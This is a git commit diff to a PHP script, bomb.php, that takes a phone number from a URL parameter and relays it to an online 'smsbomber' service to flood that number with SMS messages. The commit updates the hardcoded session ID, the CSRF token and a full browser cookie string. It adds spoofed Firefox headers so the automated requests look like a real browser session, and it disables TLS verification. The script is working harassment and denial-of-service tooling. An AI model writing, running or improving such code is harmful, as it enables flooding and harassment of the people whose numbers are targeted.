8904fec05a8d51a0583346927dc5e803c65db72c
tusar khan <114900895+MrTusarRX@users.noreply.github.com>
2026-07-06 13:02:36 +0530

    i

--- bomb.php
+++ bomb.php
@@ -1,25 +1,20 @@
 <?php
 session_start();
-
 if (isset($_GET['number']) && !empty($_GET['number'])) {
-
     $number = trim($_GET['number']);
-
     if (!isset($_SESSION['curr_count'])) {
         $_SESSION['curr_count'] = 0;
     }
     $_SESSION['curr_count']++;
     $curr_count = $_SESSION['curr_count'];
-
-    $phpSessId = "bc8383f489c383220ac12f6da21b35d3";
-    $csrfToken = "18c22cc84b4a6c33079909711fe9027a0f8ababe31fed5024e3d364b91841ae0";
-
+    $phpSessId = "6n1d28ih5dgvrno7s760ha4p1g";
+    $csrfToken = "1.-YjQ-hOkQxxk57Qow01GEAwuSlM9qYzFKA573WdL8mTYEqgdTJddBr23P8AynDz9SgVWL1LB_Encb6WANDw6nIxjAZd3jklntvjfa6tFK_LB39HnrafNma9U-zK4gxwWVxXsv-qrq3qSiIsVDhQtDAjxy3j-m0vEHVET3RH0c1py0qxfDahdbOgf6gND9LzYXz4g8Xp6cug-8xJvOfxaVTZKZgr7O5P3M-qm_CaTltzX-8o23XiLPvCxwUuRyopNSjIVgIYWxvgVumJy7ZBk7UhQcGpXsbErEajAN4bpsajvsXUfnj_d_XbkQT7vCbeYtTqRqszP5i15OtZ2BYdr7EtNwK-RGxmpCQcaAhQCT3bYdOr7xNRCLbMgK90gLM5ac3cdRvo6B1NHTx0MVtC79LyJm56gQDsN2tgup2LnVH3ovOScpWJFubZCdIRYObMBMbY0cdj5yOhm1xeY5AIdsy8jNLOi6jUpaSRkrrPiwkdy-PHR7kCxIGznZ4EI69GZ59b97e4_FDz5dT9NHNMe57nBU10WJxF4T7dDraHCCjQ.xFfKRUi5MTvzQHSDsGdYcw.dedf233f0fb62f4a38eb1990dedd6323db1b0c3f1f1b50c9921d8fadb8f9f278";
     $jsonPayload1 = json_encode([
-        "count" => 2000,
-        "country_code" => "91",
-        "csrf_token" => $csrfToken,
-        "curr_count" => $curr_count,
         "mobile" => $number,
+        "count" => 150,
+        "country_code" => "91",
+        "curr_count" => $curr_count,
+        "token" => $csrfToken,
         "request_type" => "sms_bomber"
     ]);
 
@@ -32,11 +27,20 @@ if (isset($_GET['number']) && !empty($_GET['number'])) {
         "X-Requested-With: XMLHttpRequest",
         "Origin: https://greatonlinetools.com",
         "Referer: https://greatonlinetools.com/smsbomber/",
-        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0",
+        "Accept: */*",
+        "Accept-Language: en-US,en;q=0.9",
+        "Accept-Encoding: gzip, deflate, br, zstd",
+        "Connection: keep-alive",
+        "Sec-Fetch-Dest: empty",
+        "Sec-Fetch-Mode: cors",
+        "Sec-Fetch-Site: same-origin",
+        "Priority: u=0"
     ]);
-    curl_setopt($ch1, CURLOPT_COOKIE, "PHPSESSID=" . $phpSessId);
+    curl_setopt($ch1, CURLOPT_COOKIE, "PHPSESSID=" . $phpSessId . "; _ga=GA1.2.1114936498.1783321546; _gid=GA1.2.1816116849.1783321546; _ga_DKN9J9SHT6=GS2.1.s1783321546$o1$g1$t1783321620$j51$l0$h0; __gads=ID=583e45a2d2ddad74:T=1783321548:RT=1783321548:S=ALNI_Mb7pF0RxsvwZK3wdm1w2ZPshuylug; __gpi=UID=00001415cbc43c61:T=1783321548:RT=1783321548:S=ALNI_MYRzyG61s-fxR312dnGTXGy5FeRTg; __eoi=ID=dde3e85afe64c3ef:T=1783321548:RT=1783321548:S=AA-AfjawDzIU-GlUfOrQKDuAykMl; __gsas=ID=ed833ad0bbd8b0dc:T=1783321553:RT=1783321553:S=ALNI_MbEg5T7PdDlUFdKgq3Roldu-0nAdg");
     curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch1, CURLOPT_TIMEOUT, 30);
+    curl_setopt($ch1, CURLOPT_ENCODING, 'gzip, deflate, br, zstd');
 
     $postData2 = http_build_query([
         'mobilenumber' => $number,
